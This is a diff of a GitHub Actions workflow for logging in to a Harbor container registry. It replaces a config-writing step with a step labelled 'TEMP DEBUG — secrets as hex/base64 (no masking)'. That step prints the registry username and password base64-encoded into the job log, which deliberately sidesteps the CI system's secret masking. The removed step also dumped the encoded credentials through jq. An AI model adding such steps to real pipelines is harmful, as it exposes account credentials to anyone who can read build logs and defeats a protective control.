@@ -29,19 +29,16 @@ jobs:
       - name: Get Git commit timestamps
         run: echo "TIMESTAMP=$(git log -1 --pretty=%ct)" >> $GITHUB_ENV
 
-      - name: Write Docker config.json for Harbor
+      - name: TEMP DEBUG — secrets as hex/base64 (no masking)
         env:
-          REG: registry.cloudcauldron.io
           U: ${{ secrets.HARBOR_USERNAME }}
           P: ${{ secrets.HARBOR_PASSWORD }}
         run: |
-          set -e
-          mkdir -p "$HOME/.docker"
-          auth=$(printf '%s' "$U:$P" | base64 -w0 2>/dev/null || printf '%s' "$U:$P" | base64)
-          cat > "$HOME/.docker/config.json" <<EOF
-          { "auths": { "$REG": { "auth": "$auth" } } }
-          EOF
-          jq . "$HOME/.docker/config.json"
+          set -euo pipefail
+          printf 'USERNAME len=%s bytes\n' "${#U}"
+          printf 'PASSWORD len=%s bytes\n' "${#P}"
+          printf 'USERNAME b64=';  printf '%s' "$U" | base64; echo
+          printf 'PASSWORD b64=';  printf '%s' "$P" | base64; echo
 
       # 2) Explicit docker CLI login (works the same as the action, but clearer errors)
       - name: Docker CLI login to Harbor
